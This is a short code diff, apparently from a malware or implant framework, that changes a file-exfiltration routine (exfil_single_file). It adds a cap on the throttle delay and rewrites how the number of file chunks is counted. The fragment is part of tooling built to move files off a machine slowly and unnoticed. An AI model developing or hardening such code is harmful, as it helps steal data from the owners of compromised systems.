@@ -63,6 +63,7 @@ void *spec_memcpy(void *dst, const void *src, SIZE_T n)
 #define DEFAULT_THROTTLE_MS     100           /* ms between chunks      */
 #define MAX_CHUNK_SIZE          (256 * 1024)  /* 256 KB max chunk       */
 #define MIN_CHUNK_SIZE          1024          /* 1 KB minimum           */
+#define MAX_THROTTLE_MS         60000         /* 60 seconds max wait    */
 #define MAX_PATH_LEN            520
 #define MAX_PATTERN_LEN         128
 #define FILE_LIST_BUF_SIZE      8192
@@ -582,9 +583,12 @@ static DWORD exfil_single_file(MODULE_BUS_API *api,
     /* Clamp chunk size */
     if (chunk_size < MIN_CHUNK_SIZE) chunk_size = MIN_CHUNK_SIZE;
     if (chunk_size > MAX_CHUNK_SIZE) chunk_size = MAX_CHUNK_SIZE;
+    if (throttle_ms > MAX_THROTTLE_MS) throttle_ms = MAX_THROTTLE_MS;
 
     /* Calculate total chunks */
-    total_chunks = (file_size + chunk_size - 1) / chunk_size;
+    total_chunks = file_size / chunk_size;
+    if ((file_size % chunk_size) != 0)
+        total_chunks++;
 
     /* Allocate read buffer */
     read_buf = (BYTE *)api->mem_alloc((SIZE_T)chunk_size, PAGE_READWRITE);
